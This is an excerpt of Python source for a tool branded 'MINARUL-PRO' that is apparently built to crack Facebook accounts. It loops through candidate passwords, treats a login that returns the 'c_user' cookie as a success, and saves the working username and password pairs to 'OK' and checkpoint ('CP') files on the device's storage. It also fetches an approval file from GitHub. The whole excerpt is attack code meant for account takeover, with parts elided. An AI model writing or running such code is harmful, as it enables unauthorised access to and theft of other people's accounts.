...
def main_apv():
    ...
    r1=requests.get("https://github.com/minarulns/Cloning/raw/main/approval.text").text
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/minarul-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/minarul-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back MINARUL-PRO Tools")
...
def R():
			...
			print ("\033[1m [!] Tool    : MINARUL-PRO")

			print (" [!] Brand   : MrMinarul")
			...
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/MD.MINARULNS/")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MINARUL-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/minarul_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/minarul_CP.txt' , 'a').write('%s\n' % wrt)
